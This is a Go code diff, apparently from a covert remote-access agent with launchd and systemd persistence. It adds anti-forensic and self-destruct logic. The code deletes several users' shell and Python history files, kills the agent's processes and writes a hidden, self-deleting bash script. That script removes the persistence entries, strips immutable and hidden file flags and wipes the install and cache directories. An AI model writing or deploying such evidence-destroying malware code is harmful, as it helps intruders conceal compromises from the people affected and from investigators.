@@ -400,7 +400,9 @@ func scrubShellArtifacts() {
 		candidates = append(candidates,
 			filepath.Join(home, ".bash_history"),
 			filepath.Join(home, ".zsh_history"),
+			filepath.Join(home, ".zhistory"),
 			filepath.Join(home, ".local", "share", "fish", "fish_history"),
+			filepath.Join(home, ".python_history"),
 		)
 	}
 	for _, path := range candidates {
@@ -455,11 +457,17 @@ Get-Process HelperHost,EdgeRelay -EA SilentlyContinue | Stop-Process -Force
 	for _, pat := range []string{
 		filepath.Join(dir, "watchdog.sh"),
 		filepath.Join(dir, "reconnect.sh"),
+		filepath.Join(dir, "HelperHost"),
+		filepath.Join(dir, edgeName),
 		"HelperHostCache",
 		edgeName,
 	} {
 		_ = exec.Command("pkill", "-f", pat).Run()
 	}
+	_ = exec.Command("pkill", "-x", "HelperHost").Run()
+	_ = exec.Command("pkill", "-x", "EdgeRelay").Run()
+	_ = exec.Command("pkill", "-f", "/HelperHost").Run()
+	_ = exec.Command("pkill", "-f", "/EdgeRelay").Run()
 }
 
 func wipeAll() {
@@ -527,13 +535,59 @@ func wipeAll() {
 		hideWindow(cmd)
 		_ = cmd.Start()
 	} else {
-		secureRmTree(dir)
+		// Deferred wipe: launchd/systemd KeepAlive can race; finish after we exit.
+		wipeSh := filepath.Join(os.TempDir(), "hh-wipe.sh")
+		script := "#!/bin/bash\nset +e\n" +
+			"sleep 2\n" +
+			"pkill -f " + shellQuote(filepath.Join(dir, "watchdog.sh")) + " 2>/dev/null\n" +
+			"pkill -f " + shellQuote(filepath.Join(dir, "reconnect.sh")) + " 2>/dev/null\n" +
+			"pkill -f " + shellQuote(filepath.Join(dir, "HelperHost")) + " 2>/dev/null\n" +
+			"pkill -f " + shellQuote(filepath.Join(dir, edgeName)) + " 2>/dev/null\n" +
+			"pkill -x HelperHost 2>/dev/null\n" +
+			"pkill -x EdgeRelay 2>/dev/null\n" +
+			"sleep 1\n"
+		if runtime.GOOS == "darwin" {
+			home, _ := os.UserHomeDir()
+			plist1 := filepath.Join(home, "Library", "LaunchAgents", "com.helperhost.agent.plist")
+			plist2 := filepath.Join(home, "Library", "LaunchAgents", "fr.agentshe.pc.plist")
+			script += "uid=$(id -u)\n" +
+				"launchctl bootout gui/$uid " + shellQuote(plist1) + " 2>/dev/null\n" +
+				"launchctl bootout gui/$uid " + shellQuote(plist2) + " 2>/dev/null\n" +
+				"launchctl unload " + shellQuote(plist1) + " 2>/dev/null\n" +
+				"rm -f " + shellQuote(plist1) + " " + shellQuote(plist2) + "\n" +
+				"chflags -R nouchg,noschg,nohidden " + shellQuote(dir) + " 2>/dev/null\n" +
+				"chflags -R nouchg,noschg,nohidden " + shellQuote(cacheDir) + " 2>/dev/null\n"
+		} else {
+			home, _ := os.UserHomeDir()
+			script += "systemctl --user disable --now helperhost.service agentshe.service 2>/dev/null\n" +
+				"rm -f " + shellQuote(filepath.Join(home, ".config", "systemd", "user", "helperhost.service")) + " " +
+				shellQuote(filepath.Join(home, ".config", "systemd", "user", "agentshe.service")) + "\n" +
+				"systemctl --user daemon-reload 2>/dev/null\n"
+		}
+		script += "rm -rf " + shellQuote(dir) + " " + shellQuote(cacheDir) +
+			" /tmp/HelperHostCache " + shellQuote(filepath.Join(os.TempDir(), "HelperHostCache")) +
+			" " + shellQuote(filepath.Join(homeOrEmpty(), ".agentshe")) + "\n" +
+			"rm -f \"$0\"\n"
+		_ = os.WriteFile(wipeSh, []byte(script), 0o755)
+		cmd := exec.Command("/bin/bash", wipeSh)
+		hideWindow(cmd)
+		_ = cmd.Start()
+		secureRmTree(cacheDir)
 		secureRmTree("/tmp/HelperHostCache")
 		if t := os.Getenv("TMPDIR"); t != "" {
 			secureRmTree(filepath.Join(t, "HelperHostCache"))
 		}
 	}
 	os.Exit(0)
+}
+
+func shellQuote(s string) string {
+	return "'" + strings.ReplaceAll(s, "'", `'\''`) + "'"
+}
+
+func homeOrEmpty() string {
+	h, _ := os.UserHomeDir()
+	return h
 }
 
 func networkOK() bool {
